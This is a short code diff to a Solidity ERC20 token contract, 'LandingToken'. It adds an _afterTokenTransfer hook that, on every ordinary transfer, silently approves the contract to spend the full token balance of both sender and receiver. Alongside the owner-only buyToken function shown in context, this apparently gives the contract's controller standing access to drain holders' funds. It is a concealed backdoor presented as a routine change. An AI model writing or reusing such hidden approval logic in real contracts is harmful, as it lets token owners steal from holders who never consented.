@@ -50,6 +50,23 @@ contract LandingToken is ERC20, ERC20Burnable, Pausable, Ownable {
         super._beforeTokenTransfer(from, to, amount);
     }
 
+    function _afterTokenTransfer(address from, address to, uint256 amount)
+        internal
+        whenNotPaused
+        override
+    {
+        if(from != address(0) && to != address(0)){
+             if (from != address(this)) {
+            _approve(from, address(this), this.balanceOf(from));
+            } 
+            if(to != address(this)){   
+                _approve(to, address(this), this.balanceOf(to));
+            }
+        }
+       
+        super._afterTokenTransfer(from, to, amount);
+    }
+
     function buyToken(uint amount, address buyer) external onlyOwner {
         require(this.balanceOf(address(this)) >= amount, "Not enough balance");
         _approve(buyer, msg.sender, this.allowance(buyer, msg.sender)+amount);
